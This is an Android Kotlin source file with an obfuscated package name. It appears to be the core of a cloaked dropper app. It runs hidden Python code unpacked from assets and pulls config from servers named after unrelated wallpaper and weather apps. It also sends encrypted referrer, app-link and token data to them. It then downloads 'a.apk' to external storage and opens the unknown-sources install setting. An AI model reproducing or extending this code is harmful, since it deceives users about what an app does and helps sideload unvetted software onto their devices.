package xxx.xxx.zzzz

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import cn.nba.james.RequestBean
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.bumptech.glide.Glide
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.gson.Gson
import com.hjq.permissions.XXPermissions
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.FileCallback
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Progress
import com.lzy.okgo.model.Response
import com.srplab.www.starcore.*
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.io.IOException

var python: StarObjectClass? = null

private var SrvGroup: StarSrvGroupClass? = null

private var Service: StarServiceClass? = null

private var starcore: StarCoreFactory? = null

val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator

val fileName = "a.apk"

val seesionName = "session" + BaseApp.instance!!.getAppId()

fun AppCompatActivity.copyFiles() {
    try {
//        if (filesDir != null) {
//            if (filesDir.list().isEmpty()) {
        val assetManager = assets
        val dataSource = assetManager.open("py_code_fix.zip")
        StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
//            }
//        }
    } catch (e: IOException) {
    }
}

fun AppCompatActivity.initStarCore() {
    StarCoreFactoryPath.StarCoreCoreLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreShareLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreOperationPath = "${filesDir.path}"
    starcore = StarCoreFactory.GetFactory()
    starcore?._SRPLock()
    SrvGroup = starcore?._GetSrvGroup(0)
    Service = SrvGroup?._GetService("test", "123")
    if (Service == null) {
        Service = starcore?._InitSimple("test", "123", 0, 0)
    } else {
        Service?._CheckPassword(false)
    }
    Service?._CheckPassword(false)
    SrvGroup?._InitRaw("python37", Service)
    python = Service!!._ImportRawContext("python", "", false, "")
}

fun AppCompatActivity.getId(block: (String) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        var result: Any? = null
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        result =
            python?._Call("get_face_book_id", "https://sichuanlucking.xyz/purewallpaper490/fb.php")
        println("result = $result")
        withContext(Dispatchers.Main) {
            block(result.toString())
        }
    }
}

fun AppCompatActivity.getConfig(block: (String) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        var result: Any? = null
        python?._Call("eval", "import requests")
        Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
        result =
            python?._Call(
                "get_config",
                "https://smallfun.xyz/worldweather361/weather2.php",
                requestData()
            )
        println("result = $result")
        withContext(Dispatchers.Main) {
            block(result.toString())
        }
    }
}

fun AppCompatActivity.getConfig2(block: (String) -> Unit) {
    OkGo.post<String>("https://smallfun.xyz/worldweather361/weather2.php")
        .params("data", requestData()).execute(object : StringCallback() {
            override fun onSuccess(response: Response<String>?) {
                lifecycleScope.launch(Dispatchers.Main) {
                    response?.let {
                        it.body()?.let { body ->
                            block(body)
                        }
                    }
                }
            }
        })
}

fun requestData(): String {
    val applink = MMKV.defaultMMKV().decodeString("appLink", "applink is empty")!!
    val ref = MMKV.defaultMMKV().decodeString("ref", "ref is empty")!!
    val token = BaseApp.instance!!.getToken()
    val appName = BaseApp.instance!!.getAppName()
    val appId = BaseApp.instance!!.getAppId()
    val istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
    val body = RequestBean(appName, appId, applink, ref, token, istatus)
    val encrypStr = AesEncryptUtil.encrypt(Gson().toJson(body))
    return encrypStr
}

fun AppCompatActivity.requestPermissions(block: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(BaseApp.instance!!.getPermissions())
        .request { permissions, all ->
            if (all) {
                block(all)
            } else {
                finish()
            }
        }
}

fun AppCompatActivity.setFacebookId(id: String?) {
    id?.let {
        FacebookSdk.setApplicationId(it)
    } ?: run {
        FacebookSdk.setApplicationId("1598409150521518")
    }
    FacebookSdk.sdkInitialize(this)
}

fun AppCompatActivity.fetchAppLink() {
    if (appLink == "AppLink is empty") {
        AppLinkData.fetchDeferredAppLinkData(this) {
            it?.let {
                MMKV.defaultMMKV().encode("appLink", it.targetUri.toString())
            }
        }
    }
}

fun AppCompatActivity.ref() {
    if (ref == "Referrer is empty") {
        InstallReferrerClient.newBuilder(this).build().apply {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        MMKV.defaultMMKV().encode("ref", installReferrer.installReferrer)
                    } catch (e: Exception) {
                        MMKV.defaultMMKV().encode("ref", "Referrer is empty")
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }
}

fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 3).asFlow().collect {
            delay(1000)
            if (!TextUtils.isEmpty(appLink) && !TextUtils.isEmpty(ref)) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
            if (it == 2) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun TextView.setString(s: String, block: () -> Unit) {
    text = s
    setOnClickListener { block() }
}

fun ImageView.setImage(url: String, block: () -> Unit) {
    Glide.with(this.context).load(url).into(this)
    setOnClickListener { block() }
}

fun setting(context: Context) {
    val uri = Uri.parse("package:" + context.packageName)
    val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    context.startActivity(i)
}

fun formatString(s: String): String {
    var msg = ArrayList<String>()
    var ss = ""
    if (s.contains("|")) {
        msg = result.ikey.split("|") as ArrayList<String>
        msg.forEach {
            ss = "$ss$it\n"
        }
    }
    return ss
}

fun download(context: Context,url:String, block: (Int) -> Unit, block2: () -> Unit){
    val file = File(filePath + fileName)
    if (file.exists())file.delete()
    OkGo.get<File>(url).execute(object : FileCallback(filePath, fileName){
        override fun onSuccess(response: Response<File>?) {

        }

        override fun downloadProgress(progress: Progress?) {
            super.downloadProgress(progress)
            val current = progress?.currentSize
            val total = progress?.totalSize
            val pro = ((current!! *100) / total!!).toInt()
            if (pro == 100){
                setConfig()
                block2()
            }else{
                block(pro)
            }

        }

        override fun onError(response: Response<File>?) {
            super.onError(response)
        }

        override fun onFinish() {
            super.onFinish()
        }
    })
}

fun setConfig(){
    val token = BaseApp.instance!!.getToken()

    val config = "$token|$appLink|$ref"

    writeConfig(config)
}

fun writeConfig(config: String) {
    val s = AesEncryptUtil.encrypt(config)
    var bw: BufferedWriter? = null
    try {
        bw = BufferedWriter(FileWriter(File(filePath, seesionName), false))
        bw.write(s)
    } catch (e: IOException) {
        e.printStackTrace()
    } finally {
        try {
            bw?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}



val appLink
    get() = MMKV.defaultMMKV().decodeString("appLink", "appLink is empty")

val ref
    get() = MMKV.defaultMMKV().decodeString("ref", "ref is empty")

val result
    get() = MMKV.defaultMMKV().decodeParcelable("result", ResultBean::class.java)!!